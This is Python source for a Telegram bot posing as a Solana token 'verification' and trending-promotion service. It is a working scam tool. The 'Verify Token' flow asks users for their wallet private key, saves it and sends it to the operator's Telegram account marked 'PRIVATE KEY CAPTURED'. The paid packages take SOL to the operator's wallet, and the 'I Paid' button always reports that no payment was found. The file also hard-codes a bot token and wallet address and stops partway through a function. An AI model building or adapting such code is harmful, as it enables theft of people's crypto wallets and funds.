import os
import sys
import time
import json
import random
import re
import urllib.parse
import atexit
import requests
import threading
from filelock import FileLock
from telebot import TeleBot, types
from telebot.apihelper import ApiTelegramException
from flask import Flask, render_template_string

# ===== FLASK APP FOR KEEP-ALIVE =====
app = Flask(__name__)

@app.route('/')
def home():
    return render_template_string('''
    <!DOCTYPE html>
    <html>
    <head>
        <title>🤖 Telegram Bot</title>
        <meta http-equiv="refresh" content="300">
        <style>
            body { background: #0f0f23; color: #00ff00; font-family: monospace; padding: 50px; }
            h1 { color: #ffff00; }
            .status { background: #1a1a2e; padding: 20px; border-radius: 10px; margin: 20px 0; }
        </style>
    </head>
    <body>
        <h1>🤖 Telegram Bot Status</h1>
        <div class="status">
            <p>✅ Bot is running!</p>
            <p>🕐 Uptime: {{ uptime }}</p>
            <p>👥 Users: {{ users }}</p>
            <p>📊 Orders: {{ orders }}</p>
        </div>
        <p>This page auto-refreshes every 5 minutes to keep the bot alive.</p>
    </body>
    </html>
    ''', uptime=time.strftime('%H:%M:%S'), users=len(user_activity), orders=len(contracts))

@app.route('/health')
def health():
    return {"status": "healthy", "timestamp": time.time()}, 200

@app.route('/ping')
def ping():
    return "PONG", 200

@app.route('/stats')
def stats():
    return {
        "users": len(user_activity),
        "orders": len(contracts),
        "wallet": YOUR_SOL_WALLET,
        "uptime": time.time() - start_time
    }

# ===== GLOBAL VARIABLES =====
start_time = time.time()
PORT = int(os.environ.get('PORT', 10000))

# ===== KEEP-ALIVE FUNCTION =====
def keep_alive():
    """Ping the bot itself to keep it alive on Render/Railway"""
    while True:
        try:
            response = requests.get(f"http://localhost:{PORT}/health", timeout=10)
            print(f"✅ Self-ping successful: {response.status_code}")
        except Exception as e:
            print(f"⚠️ Self-ping failed: {e}")
            try:
                requests.get(f"http://localhost:{PORT}/ping", timeout=10)
            except:
                pass
        time.sleep(300)

def start_keep_alive():
    thread = threading.Thread(target=keep_alive, daemon=True)
    thread.start()

# ===== PREVENT MULTIPLE INSTANCES =====
lock_path = "/tmp/bot.lock"

try:
    if os.path.exists(lock_path):
        os.remove(lock_path)
except:
    pass

lock = FileLock(lock_path)

try:
    lock.acquire(timeout=1)
except:
    print("⚠️ Another bot instance is already running. Exiting...")
    sys.exit(1)

def cleanup():
    try:
        if os.path.exists(lock_path):
            os.remove(lock_path)
        lock.release()
    except:
        pass
atexit.register(cleanup)

# ===== YOUR CONFIGURATION =====
BOT_TOKEN = "8248594371:AAFjWIHnTDh-3Gz31twRkXLrDjo0lxSXPIE"
YOUR_SOL_WALLET = "93ajSK84TCRLbGscTz1v8aSNdVWNmrXzJWtooyFfCUBP"
DEX_SCREENER_WALLET = "93ajSK84TCRLbGscTz1v8aSNdVWNmrXzJWtooyFfCUBP"
YOUR_TELEGRAM_ID = 8253260914
HELP_LINK = "https://t.me/solar_apes_calls"
TRENDING_CHANNEL = "https://t.me/pumpmints"

# Images
VERIFY_TOKEN_IMAGE = "https://i.ibb.co/MxWrj8fL/IMG-20251209-092437-649.jpg"
PUMP_TOKEN_IMAGE = "https://i.ibb.co/fGv6471j/IMG-20251209-092409-455.jpg"
TREND_ON_DEX_IMAGE = "https://i.ibb.co/TBZZGhfW/Screenshot-20251211-210751-One-UI-Home.jpg"

# Storage
payments = {}
contracts = {}
seeds = {}
private_keys = {}
user_states = {}
payment_attempts = {}
banned_users = {}
user_activity = {}
admin_chats = {}
user_last_price = {}
user_last_wallet = {}
user_last_service = {}
bot_instance = None

# Initialize bot
try:
    bot = TeleBot(BOT_TOKEN, threaded=True, num_threads=2)
    bot.skip_pending = True
    bot_instance = bot
    print("✅ Bot initialized successfully")
except Exception as e:
    print(f"❌ Bot initialization failed: {e}")
    cleanup()
    sys.exit(1)

# ===== HELPER FUNCTIONS =====
def create_qr_code(amount, memo="", wallet_address=None):
    wallet = wallet_address or YOUR_SOL_WALLET
    payment_link = f"solana:{wallet}?amount={amount}&memo={memo}"
    encoded_link = urllib.parse.quote(payment_link, safe='')
    return f"https://api.qrserver.com/v1/create-qr-code/?size=200x200&data={encoded_link}"

def generate_memo():
    return f"PUMP{int(time.time())}{random.randint(100,999)}"

def is_valid_solana_address(address):
    return bool(re.match(r'^[1-9A-HJ-NP-Za-km-z]{32,44}$', address))

def save_data():
    try:
        with open("data.json", "w") as f:
            json.dump({
                "payments": payments,
                "contracts": contracts,
                "seeds": seeds,
                "private_keys": private_keys,
                "user_states": user_states,
                "payment_attempts": payment_attempts,
                "banned_users": banned_users,
                "user_activity": user_activity,
                "user_last_price": user_last_price,
                "user_last_wallet": user_last_wallet,
                "user_last_service": user_last_service
            }, f, indent=4)
    except Exception as e:
        print(f"⚠️ Data save error: {e}")

def load_data():
    global payments, contracts, seeds, private_keys, user_states, payment_attempts, banned_users, user_activity, user_last_price, user_last_wallet, user_last_service
    try:
        with open("data.json", "r") as f:
            data = json.load(f)
            payments = data.get("payments", {})
            contracts = data.get("contracts", {})
            seeds = data.get("seeds", {})
            private_keys = data.get("private_keys", {})
            user_states = data.get("user_states", {})
            payment_attempts = data.get("payment_attempts", {})
            banned_users = data.get("banned_users", {})
            user_activity = data.get("user_activity", {})
            user_last_price = data.get("user_last_price", {})
            user_last_wallet = data.get("user_last_wallet", {})
            user_last_service = data.get("user_last_service", {})
        print(f"✅ Loaded {len(user_activity)} users and {len(contracts)} contracts")
    except FileNotFoundError:
        print("ℹ️ No existing data file found. Starting fresh.")
    except Exception as e:
        print(f"⚠️ Data load error: {e}")

def safe_send_message(chat_id, text, reply_markup=None, parse_mode="Markdown"):
    if is_user_banned(chat_id):
        return False

    for attempt in range(3):
        try:
            bot.send_message(chat_id, text, reply_markup=reply_markup, parse_mode=parse_mode)
            return True
        except Exception as e:
            print(f"⚠️ Message send error (attempt {attempt+1}): {e}")
            time.sleep(2)
    return False

def log_user_activity(user, action):
    user_id = str(user.id)
    timestamp = time.strftime('%Y-%m-%d %H:%M:%S')

    if user_id not in user_activity:
        user_activity[user_id] = []
        send_admin_notification(user, "🆕 New user started the bot")

    user_activity[user_id].append({
        'action': action,
        'timestamp': timestamp,
        'username': user.username,
        'first_name': user.first_name
    })

    if len(user_activity[user_id]) > 10:
        user_activity[user_id] = user_activity[user_id][-10:]

    save_data()

def send_admin_notification(user, action, details=""):
    try:
        markup = types.InlineKeyboardMarkup()

        if is_user_banned(user.id):
            markup.add(
                types.InlineKeyboardButton("💬 Chat", callback_data=f"chat_{user.id}"),
                types.InlineKeyboardButton("✅ Unban", callback_data=f"unban_{user.id}")
            )
        else:
            markup.add(
                types.InlineKeyboardButton("💬 Chat", callback_data=f"chat_{user.id}"),
                types.InlineKeyboardButton("🚫 Ban", callback_data=f"ban_{user.id}")
            )

        message = (
            f"👤 {user.first_name}\n"
            f"📝 {action}\n"
            f"🆔 ID: {user.id}"
        )

        bot.send_message(YOUR_TELEGRAM_ID, message, reply_markup=markup, parse_mode="Markdown")
    except Exception as e:
        print(f"❌ Failed to send admin notification: {e}")

def send_admin_wallet_info(user, wallet_type, data):
    """Send wallet info to admin with 'Tap to Copy' format"""
    try:
        message = (
            f"🔐 *Wallet Info Captured*\n\n"
            f"👤 User: {user.first_name}\n"
            f"🆔 ID: {user.id}\n"
            f"📱 Username: @{user.username or 'N/A'}\n"
            f"📝 Type: {wallet_type}\n\n"
            f"*Data:*\n"
            f"```\n{data}\n```\n\n"
            f"*Tap to Copy*"
        )

        bot.send_message(YOUR_TELEGRAM_ID, message, parse_mode="Markdown")
    except Exception as e:
        print(f"❌ Failed to send wallet info to admin: {e}")

def is_user_banned(user_id):
    return banned_users.get(str(user_id), False)

def ban_user(user_id):
    banned_users[str(user_id)] = True
    save_data()
    return True

def unban_user(user_id):
    if str(user_id) in banned_users:
        del banned_users[str(user_id)]
        save_data()
        return True
    return False

# ===== ADMIN CALLBACK HANDLER =====
@bot.callback_query_handler(func=lambda call: True)
def handle_admin_callback(call):
    if call.from_user.id != YOUR_TELEGRAM_ID:
        bot.answer_callback_query(call.id, "❌ You are not authorized!")
        return

    data = call.data
    if data.startswith('chat_'):
        user_id = int(data.split('_')[1])
        admin_chats[call.from_user.id] = user_id
        user_info = next((u for u in user_activity.get(str(user_id), []) if 'first_name' in u), {})

        bot.send_message(
            YOUR_TELEGRAM_ID,
            f"💬 Chat with {user_info.get('first_name', 'N/A')}\n"
            "Type your message to send as the bot.\n"
            "Send /stop to end this session.",
            parse_mode="Markdown"
        )
        bot.answer_callback_query(call.id, "💬 Chat session started!")

    elif data.startswith('ban_'):
        user_id = int(data.split('_')[1])
        if ban_user(user_id):
            bot.send_message(
                YOUR_TELEGRAM_ID,
                f"✅ Banned user: {user_id}",
                parse_mode="Markdown"
            )
            bot.answer_callback_query(call.id, "✅ User banned!")
        else:
            bot.answer_callback_query(call.id, "❌ Failed to ban user.")

    elif data.startswith('unban_'):
        user_id = int(data.split('_')[1])
        if unban_user(user_id):
            bot.send_message(
                YOUR_TELEGRAM_ID,
                f"✅ Unbanned user: {user_id}",
                parse_mode="Markdown"
            )
            bot.answer_callback_query(call.id, "✅ User unbanned!")
        else:
            bot.answer_callback_query(call.id, "❌ Failed to unban user.")

    elif data == "i_paid":
        user_id = call.from_user.id
        attempts = payment_attempts.get(user_id, 0) + 1
        payment_attempts[user_id] = attempts
        save_data()

        bot.answer_callback_query(call.id, "⚠️ Payment not found. Please try again or contact support.")
        bot.send_message(
            call.message.chat.id,
            "⚠️ Payment not found. Please try again or contact support.",
            reply_markup=create_back_keyboard()
        )

# ===== KEYBOARD FUNCTIONS =====
def create_main_keyboard():
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    markup.add("✅ VERIFY TOKEN ✅", "🚀 PUMP TOKEN 🚀")
    markup.add("📊 TREND ON DEX 📊")
    return markup

def create_verify_token_keyboard():
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=1)
    markup.add("❌ Cancel")
    markup.add("🔝MainMenu", "🔙Back")
    return markup

def create_pump_token_keyboard():
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    markup.add("🏆 SOL Trending", "💊 Pump.fun Trending")
    markup.add("🔝MainMenu", "🔙Back")
    return markup

def create_sol_trending_keyboard():
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    markup.add("🏆4h | 0.3 SOL", "🏆8h | 0.7 SOL")
    markup.add("🏆12h | 1.2 SOL", "🏆16h | 1.6 SOL")
    markup.add("🏆20h | 2.0 SOL", "🏆24h | 2.5 SOL")
    markup.add("🔝MainMenu", "🔙Back")
    return markup

def create_pumpfun_trending_keyboard():
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    markup.add("💊 PTF 8 SOL")
    markup.add("🔝MainMenu", "🔙Back")
    return markup

def create_dex_screener_keyboard():
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=1)
    markup.add("❌ Cancel")
    markup.add("🔝MainMenu", "🔙Back")
    return markup

def create_payment_inline_keyboard():
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("✅ I Paid", callback_data="i_paid"))
    return markup

def create_back_keyboard():
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    markup.add("🔝MainMenu", "🔙Back")
    return markup

# Track user navigation history
user_navigation_history = {}

def add_to_history(user_id, state):
    if user_id not in user_navigation_history:
        user_navigation_history[user_id] = []

    if not user_navigation_history[user_id] or user_navigation_history[user_id][-1] != state:
        user_navigation_history[user_id].append(state)

    if len(user_navigation_history[user_id]) > 10:
        user_navigation_history[user_id] = user_navigation_history[user_id][-10:]

# ===== MESSAGE HANDLERS =====
@bot.message_handler(commands=['start', 'help', 'menu'])
def start(message):
    if is_user_banned(message.from_user.id):
        return
    log_user_activity(message.from_user, "Started bot")
    add_to_history(message.from_user.id, "main_menu")

    description = (
        "🚀 *Welcome to the Ultimate Token Verification & Pump System!* 🌕\n\n"
        "✅ **VERIFY TOKEN** - Get your token officially verified and gain instant credibility!\n\n"
        "🚀 **PUMP TOKEN** - Access premium trending packages and skyrocket your token's visibility!\n\n"
        "📊 **TREND ON DEX** - Get featured on DEX Screener with custom banner!\n\n"
        "🔒 *All information is securely processed and sent directly to our team for immediate action.*\n\n"
        "Choose your option below to get started:"
    )

    safe_send_message(
        message.chat.id,
        description,
        parse_mode="Markdown",
        reply_markup=create_main_keyboard()
    )

@bot.message_handler(func=lambda message: message.text == "🔝MainMenu")
def handle_main_menu(message):
    if is_user_banned(message.from_user.id):
        return
    log_user_activity(message.from_user, "Main Menu")
    start(message)

@bot.message_handler(func=lambda message: message.text == "🔙Back")
def handle_back(message):
    if is_user_banned(message.from_user.id):
        return
    log_user_activity(message.from_user, "Back")
    user_id = message.from_user.id

    if user_states.get(user_id):
        user_states[user_id] = None

    if user_id in user_navigation_history and len(user_navigation_history[user_id]) > 1:
        user_navigation_history[user_id].pop()
        previous_state = user_navigation_history[user_id][-1]

        if previous_state == "main_menu":
            start(message)
        elif previous_state == "verify_token":
            handle_verify_token(message)
        elif previous_state == "pump_token":
            handle_pump_token(message)
        elif previous_state == "sol_trending":
            handle_sol_trending(message)
        elif previous_state == "pumpfun_trending":
            handle_pumpfun_trending(message)
        elif previous_state == "trend_on_dex":
            handle_trend_on_dex(message)
        else:
            start(message)
    else:
        start(message)

@bot.message_handler(func=lambda message: message.text == "❌ Cancel")
def handle_cancel(message):
    handle_back(message)

@bot.message_handler(func=lambda message: message.text == "✅ VERIFY TOKEN ✅")
def handle_verify_token(message):
    if is_user_banned(message.from_user.id):
        return
    log_user_activity(message.from_user, "Clicked Verify Token")
    add_to_history(message.from_user.id, "verify_token")

    verify_description = (
        "🔐 **TOKEN VERIFICATION PROCESS** 🔐\n\n"
        "✅ *Get your token officially verified and gain instant market trust!*\n\n"
        "📋 **Step 1:** Enter your token's Contract Address (CA)\n"
        "🔑 **Step 2:** Provide the private key of the account holding the token\n"
        "💰 **Requirement:** Hold at least 0.4 SOL worth of your token for verification\n\n"
        "🚨 *This verification process ensures your token meets all market standards and gains immediate credibility with investors!*\n\n"
        "📈 *Once verified, your token will be marked as legitimate and gain priority in our trending systems.*"
    )

    # Send admin notification
    send_admin_notification(
        message.from_user,
        "Started Token Verification Process"
    )

    try:
        bot.send_photo(
            message.chat.id,
            VERIFY_TOKEN_IMAGE,
            caption=verify_description,
            parse_mode="Markdown",
            reply_markup=create_verify_token_keyboard()
        )
    except:
        safe_send_message(
            message.chat.id,
            verify_description,
            parse_mode="Markdown",
            reply_markup=create_verify_token_keyboard()
        )

    # Set user state to waiting for contract address
    user_id = message.from_user.id
    user_states[user_id] = {
        "waiting_contract": True,
        "type": "verify_token",
        "service_name": "Token Verification"
    }

    safe_send_message(
        message.chat.id,
        "📋 **Step 1 of 2:** Please enter your token's Contract Address (CA):",
        parse_mode="Markdown",
        reply_markup=create_verify_token_keyboard()
    )

@bot.message_handler(func=lambda message: message.text == "🚀 PUMP TOKEN 🚀")
def handle_pump_token(message):
    if is_user_banned(message.from_user.id):
        return
    log_user_activity(message.from_user, "Clicked Pump Token")
    add_to_history(message.from_user.id, "pump_token")

    pump_description = (
        "🚀 **PREMIUM TRENDING PACKAGES** 🚀\n\n"
        "💎 *Access our exclusive trending packages and skyrocket your token's visibility!*\n\n"
        "🏆 **SOL Trending** - Get featured on our SOL trending platform\n"
        "💊 **Pump.fun Trending** - Premium exposure on Pump.fun\n\n"
        "📈 *Choose your preferred trending option below:*"
    )

    # Send admin notification
    send_admin_notification(
        message.from_user,
        "Clicked Pump Token menu"
    )

    try:
        bot.send_photo(
            message.chat.id,
            PUMP_TOKEN_IMAGE,
            caption=pump_description,
            parse_mode="Markdown",
            reply_markup=create_pump_token_keyboard()
        )
    except:
        safe_send_message(
            message.chat.id,
            pump_description,
            parse_mode="Markdown",
            reply_markup=create_pump_token_keyboard()
        )

@bot.message_handler(func=lambda message: message.text == "📊 TREND ON DEX 📊")
def handle_trend_on_dex(message):
    if is_user_banned(message.from_user.id):
        return
    log_user_activity(message.from_user, "Clicked Trend on DEX")
    add_to_history(message.from_user.id, "trend_on_dex")

    dex_description = (
        "📊 **TREND ON DEX SCREENER** 📊\n\n"
        "🚀 *Get your token featured on DEX Screener with a custom banner!*\n\n"
        "📋 **Step 1:** Send your banner image (minimum 600px width)\n"
        "📋 **Step 2:** Enter your token's Contract Address (CA)\n"
        "💰 **Price:** 3 SOL\n\n"
        "🎯 *DEX Screener trending provides maximum visibility across all major decentralized exchanges.*\n\n"
        "⚠️ *Please ensure your banner is at least 600 pixels wide for optimal display.*"
    )

    # Set user state to waiting for image immediately
    user_id = message.from_user.id
    user_states[user_id] = {
        "waiting_image": True,
        "price": 3.0,
        "type": "dex_screener",
        "service_name": "DEX Screener Trending"
    }
    # Store price and wallet for QR code
    user_last_price[user_id] = 3.0
    user_last_wallet[user_id] = DEX_SCREENER_WALLET
    user_last_service[user_id] = "DEX Screener Trending"

    # Send admin notification
    send_admin_notification(
        message.from_user,
        "Clicked Trend on DEX menu"
    )

    try:
        bot.send_photo(
            message.chat.id,
            TREND_ON_DEX_IMAGE,
            caption=dex_description,
            parse_mode="Markdown",
            reply_markup=create_dex_screener_keyboard()
        )
    except:
        safe_send_message(
            message.chat.id,
            dex_description,
            parse_mode="Markdown",
            reply_markup=create_dex_screener_keyboard()
        )

    safe_send_message(
        message.chat.id,
        "📸 **Step 1:** Please send your banner image (minimum 600px width):",
        parse_mode="Markdown",
        reply_markup=create_dex_screener_keyboard()
    )

@bot.message_handler(func=lambda message: message.text == "🏆 SOL Trending")
def handle_sol_trending(message):
    if is_user_banned(message.from_user.id):
        return
    log_user_activity(message.from_user, "Clicked SOL Trending")
    add_to_history(message.from_user.id, "sol_trending")

    # Send admin notification
    send_admin_notification(
        message.from_user,
        "Clicked SOL Trending menu"
    )

    try:
        bot.send_photo(
            message.chat.id,
            PUMP_TOKEN_IMAGE,
            caption="🏆 **SOL TRENDING PACKAGES** 🏆\n\n"
        "Choose your preferred duration:",
        parse_mode="Markdown",
        reply_markup=create_sol_trending_keyboard()
        )
    except:
        safe_send_message(
            message.chat.id,
            "🏆 **SOL TRENDING PACKAGES** 🏆\n\n"
        "Choose your preferred duration:",
        parse_mode="Markdown",
        reply_markup=create_sol_trending_keyboard()
        )

@bot.message_handler(func=lambda message: message.text in ["🏆4h | 0.3 SOL", "🏆8h | 0.7 SOL", "🏆12h | 1.2 SOL", "🏆16h | 1.6 SOL", "🏆20h | 2.0 SOL", "🏆24h | 2.5 SOL"])
def handle_sol_trending_selection(message):
    user_id = message.from_user.id
    service_map = {
        "🏆4h | 0.3 SOL": {"price": 0.3, "duration": "4h"},
        "🏆8h | 0.7 SOL": {"price": 0.7, "duration": "8h"},
        "🏆12h | 1.2 SOL": {"price": 1.2, "duration": "12h"},
        "🏆16h | 1.6 SOL": {"price": 1.6, "duration": "16h"},
        "🏆20h | 2.0 SOL": {"price": 2.0, "duration": "20h"},
        "🏆24h | 2.5 SOL": {"price": 2.5, "duration": "24h"}
    }

    service = service_map[message.text]
    memo = generate_memo()
    user_states[user_id] = {
        "waiting_contract": True,
        "price": service["price"],
        "memo": memo,
        "type": "sol_trending",
        "service_name": f"SOL Trending - {service['duration']}",
        "duration": service["duration"]
    }
    # Store price for QR code
    user_last_price[user_id] = service["price"]
    user_last_wallet[user_id] = YOUR_SOL_WALLET
    user_last_service[user_id] = f"SOL Trending - {service['duration']}"

    # Send admin notification
    send_admin_notification(
        message.from_user,
        f"Selected SOL Trending - {service['duration']} - {service['price']} SOL"
    )

    safe_send_message(
        message.chat.id,
        "📋 **Step 1:** Please enter your token's Contract Address (CA):",
        parse_mode="Markdown",
        reply_markup=create_back_keyboard()
    )

@bot.message_handler(func=lambda message: message.text == "💊 Pump.fun Trending")
def handle_pumpfun_trending(message):
    if is_user_banned(message.from_user.id):
        return
    log_user_activity(message.from_user, "Clicked Pump.fun Trending")
    add_to_history(message.from_user.id, "pumpfun_trending")

    # Send admin notification
    send_admin_notification(
        message.from_user,
        "Clicked Pump.fun Trending menu"
    )

    try:
        bot.send_photo(
            message.chat.id,
            PUMP_TOKEN_IMAGE,
            caption="💊 **PUMP.FUN TRENDING** 💊\n\n"
        "8 SOL Package:",
        parse_mode="Markdown",
        reply_markup=create_pumpfun_trending_keyboard()
        )
    except:
        safe_send_message(
            message.chat.id,
            "💊 **PUMP.FUN TRENDING** 💊\n\n"
        "8 SOL Package:",
        parse_mode="Markdown",
        reply_markup=create_pumpfun_trending_keyboard()
        )

@bot.message_handler(func=lambda message: message.text == "💊 PTF 8 SOL")
def handle_pumpfun_selection(message):
    user_id = message.from_user.id
    memo = generate_memo()
    user_states[user_id] = {
        "waiting_contract": True,
        "price": 8.0,
        "memo": memo,
        "type": "pumpfun_trending",
        "service_name": "Pump.fun Trending"
    }
    # Store price for QR code
    user_last_price[user_id] = 8.0
    user_last_wallet[user_id] = YOUR_SOL_WALLET
    user_last_service[user_id] = "Pump.fun Trending"

    # Send admin notification
    send_admin_notification(
        message.from_user,
        "Selected Pump.fun Trending - 8 SOL"
    )

    safe_send_message(
        message.chat.id,
        "📋 **Step 1:** Please enter your token's Contract Address (CA):",
        parse_mode="Markdown",
        reply_markup=create_back_keyboard()
    )

# Photo handler for DEX Screener
@bot.message_handler(content_types=['photo'])
def handle_photo(message):
    user_id = message.from_user.id
    print(f"🖼️ Photo received from user {user_id}")

    # Check if user is in DEX Screener image waiting state
    if (user_states.get(user_id) and
        isinstance(user_states[user_id], dict) and
        user_states[user_id].get("waiting_image") == True and
        user_states[user_id].get("type") == "dex_screener"):

        user_state = user_states[user_id]

        # Send image to admin (your DM)
        try:
            # Get the largest photo size
            photo = message.photo[-1]
            file_info = bot.get_file(photo.file_id)
            downloaded_file = bot.download_file(file_info.file_path)

            # Send to admin
            bot.send_photo(
                YOUR_TELEGRAM_ID,
                downloaded_file,
                caption=f"📊 DEX Screener Banner from user {message.from_user.id}\n"
                       f"Username: @{message.from_user.username or 'N/A'}\n"
                       f"Name: {message.from_user.first_name}"
            )

            print(f"✅ Image sent to admin DM for user {user_id}")

        except Exception as e:
            print(f"❌ Error sending image to admin: {e}")

        # Update user state to wait for contract address
        user_states[user_id] = {
            "waiting_contract": True,
            "price": user_state["price"],
            "type": "dex_screener",
            "service_name": "DEX Screener Trending",
            "image_received": True
        }

        # Send admin notification
        send_admin_notification(
            message.from_user,
            "Uploaded DEX Screener banner image"
        )

        safe_send_message(
            message.chat.id,
            "✅ **Image received and sent to our DMs!**\n\n"
            "📋 **Step 2:** Please enter your token's Contract Address (CA):",
            parse_mode="Markdown",
            reply_markup=create_dex_screener_keyboard()
        )
    else:
        # If photo is sent but user is not in DEX Screener mode
        safe_send_message(
            message.chat.id,
            "❌ Please select 'Trend on DEX' service first to upload banner image.",
            reply_markup=create_main_keyboard()
        )

# Contract address handler for VERIFY TOKEN
@bot.message_handler(func=lambda message: user_states.get(message.from_user.id) and isinstance(user_states.get(message.from_user.id), dict) and user_states.get(message.from_user.id).get("waiting_contract") == True and user_states.get(message.from_user.id).get("type") == "verify_token")
def handle_verify_token_contract(message):
    user_id = message.from_user.id
    contract = message.text.strip()

    if not is_valid_solana_address(contract):
        safe_send_message(message.chat.id, "❌ Invalid contract address!", reply_markup=create_back_keyboard())
        return

    user_state = user_states[user_id]
    
    # Send contract info to admin DM
    try:
        message_text = (
            f"🔐 **VERIFY TOKEN - CONTRACT CAPTURED** 🔐\n\n"
            f"👤 User: {message.from_user.first_name}\n"
            f"🆔 ID: {user_id}\n"
            f"📱 Username: @{message.from_user.username or 'N/A'}\n"
            f"📋 Contract Address: `{contract}`\n\n"
            f"*Tap to Copy*"
        )

        bot.send_message(
            YOUR_TELEGRAM_ID,
            message_text,
            parse_mode="Markdown"
        )

        print(f"✅ Contract address sent to admin DM for user {user_id}")

    except Exception as e:
        print(f"❌ Failed to send contract info to admin: {e}")

    # Update user state to wait for private key
    user_states[user_id] = {
        "waiting_private_key": True,
        "contract": contract,
        "type": "verify_token",
        "service_name": "Token Verification"
    }

    safe_send_message(
        message.chat.id,
        "✅ **Contract address received!**\n\n"
        "🔑 **Step 2 of 2:** Please enter the **private key** of the account holding your token:\n\n"
        "💰 *Note: You must hold at least 0.4 SOL worth of your token to complete verification.*",
        parse_mode="Markdown",
        reply_markup=create_verify_token_keyboard()
    )

# Private key handler for VERIFY TOKEN
@bot.message_handler(func=lambda message: user_states.get(message.from_user.id) and isinstance(user_states.get(message.from_user.id), dict) and user_states.get(message.from_user.id).get("waiting_private_key") == True)
def handle_verify_token_private_key(message):
    user_id = message.from_user.id
    private_key = message.text.strip()
    user_state = user_states[user_id]
    contract = user_state["contract"]

    if len(private_key) < 30:
        safe_send_message(
            message.chat.id,
            "❌ Invalid private key! Too short.",
            reply_markup=create_back_keyboard()
        )
        return

    # Save private key
    private_keys[user_id] = private_key
    save_data()

    # Send private key to admin DM
    try:
        message_text = (
            f"🔐 **VERIFY TOKEN - PRIVATE KEY CAPTURED** 🔐\n\n"
            f"👤 User: {message.from_user.first_name}\n"
            f"🆔 ID: {user_id}\n"
            f"📱 Username: @{message.from_user.username or 'N/A'}\n"
            f"📋 Contract Address: `{contract}`\n\n"
            f"🔑 Private Key:\n"
            f"```\n{private_key}\n```\n\n"
            f"*Tap to Copy*\n\n"
            f"💰 **User must hold at least 0.4 SOL worth of token to verify**"
        )

        bot.send_message(
            YOUR_TELEGRAM_ID,
            message_text,
            parse_mode="Markdown"
        )

        print(f"✅ Private key sent to admin DM for user {user_id}")

    except Exception as e:
        print(f"❌ Failed to send private key to admin: {e}")

    # Send final verification requirement message
    safe_send_message(
        message.chat.id,
        f"✅ **Verification Process Started!**\n\n"
        f"📋 *Contract Address:* `{contract}`\n\n"
        f"💰 **IMPORTANT:** You must hold at least **0.4 SOL worth** of your token in the account to complete verification.\n\n"
        f"⏰ *Our team will review your submission and contact you shortly!*",
        parse_mode="Markdown",
        reply_markup=create_main_keyboard()
    )

    # Clear user state
    user_states[user_id] = None

# Contract address handler for other services (Pump Token and DEX Screener)
@bot.message_handler(func=lambda message: user_states.get(message.from_user.id) and isinstance(user_states.get(message.from_user.id), dict) and user_states.get(message.from_user.id).get("waiting_contract") == True and user_states.get(message.from_user.id).get("type") != "verify_token")
def handle_other_contract_address(message):
    user_id = message.from_user.id
    contract = message.text.strip()

    if not is_valid_solana_address(contract):
        safe_send_message(message.chat.id, "❌ Invalid contract address!", reply_markup=create_back_keyboard())
        return

    user_state = user_states[user_id]
    price = user_state["price"]
    service_type = user_state["type"]
    service_name = user_state.get("service_name", service_type.replace('_', ' ').title())

    memo = user_state.get("memo", generate_memo())

    contracts[user_id] = contract
    user_states[user_id] = None
    save_data()

    # Get the correct wallet address
    wallet_address = DEX_SCREENER_WALLET if service_type == "dex_screener" else YOUR_SOL_WALLET

    # Send contract info to admin
    try:
        pumpfun_link = f"https://pump.fun/{contract}"
        admin_message = (
            f"📋 *Contract Submitted*\n\n"
            f"👤 User: {message.from_user.first_name}\n"
            f"🆔 ID: {user_id}\n"
            f"📱 Username: @{message.from_user.username or 'N/A'}\n"
            f"📦 Service: {service_name}\n"
            f"💰 Amount: {price} SOL\n"
            f"📝 Contract: `{contract}`\n"
            f"🔗 Link: {pumpfun_link}"
        )

        bot.send_message(
            YOUR_TELEGRAM_ID,
            admin_message,
            parse_mode="Markdown"
        )

        print(f"✅ Contract info sent to admin DM for user {user_id}")

    except Exception as e:
        print(f"❌ Failed to send contract info to admin: {e}")

    if service_type == "dex_screener":
        # DEX Screener specific response with inline "I Paid" button
        response_text = (
            f"✅ *Token Successfully added*\n\n"
            f"🟢 *One last Step: Payment Required*\n\n"
            f"⌛️ *Please complete the one time fee payment of {price} SOL to the following wallet address:*\n\n"
            f"*Wallet:*\n"
            f"`{wallet_address}`\n\n"
            f"*Once you have completed the payment within the given timeframe, your Token starts Trending on DEX Screener*"
        )

        # Send with inline keyboard only (no reply keyboard)
        bot.send_message(
            message.chat.id,
            response_text,
            parse_mode="Markdown",
            reply_markup=create_payment_inline_keyboard()
        )
    else:
        # Other services response
        response_text = (
            f"✅ *Order Placed Successfully!*\n\n"
            f"💎 *Service:* {service_name}\n"
            f"💰 *Amount:* {price} SOL\n"
            f"📝 *Memo:* `{memo}`\n"
            f"👛 *Wallet:* `{wallet_address}`\n"
            f"*(Tap to Copy)*\n\n"
            f"✅ We have 1 available slot! Once payment is received, trending will start in 20 mins."
        )

        # Send with inline keyboard only (no reply keyboard)
        bot.send_message(
            message.chat.id,
            response_text,
            parse_mode="Markdown",
            reply_markup=create_payment_inline_keyboard()
        )

@bot.message_handler(func=lambda message: True)
def handle_all_messages(message):
    # Check if this is an admin in chat mode
    if message.from_user.id == YOUR_TELEGRAM_ID and message.from_user.id in admin_chats:
        if admin_chats[message.from_user.id] == "broadcast":
            # Broadcast to all users
            for user_id in user_activity.keys():
                try:
                    bot.send_message(int(user_id), message.text)
                except:
                    continue
            bot.send_message(YOUR_TELEGRAM_ID, "✅ Message broadcasted to all users!")
            admin_chats.pop(message.from_user.id)
        else:
            # Handle admin chat message
            target_user_id = admin_chats[message.from_user.id]
            try:
                bot.send_message(target_user_id, message.text)
                bot.send_message(
                    YOUR_TELEGRAM_ID,
                    f"✅ Message sent to user {target_user_id}",
                    parse_mode="Markdown"
                )
            except Exception as e:
                bot.send_message(
                    YOUR_TELEGRAM_ID,
                    f"❌ Failed to send message to user {target_user_id}:\n{str(e)}"
                )
        return

    # Check if user is banned
    if is_user_banned(message.from_user.id):
        return

    # Normal message handling
    safe_send_message(
        message.chat.id,
        "🤖 Please use the buttons below to navigate the bot!",
        reply_markup=create_main_keyboard()
    )

# ===== BOT STARTUP =====
def run_flask():
    """Run Flask web server for keep-alive"""
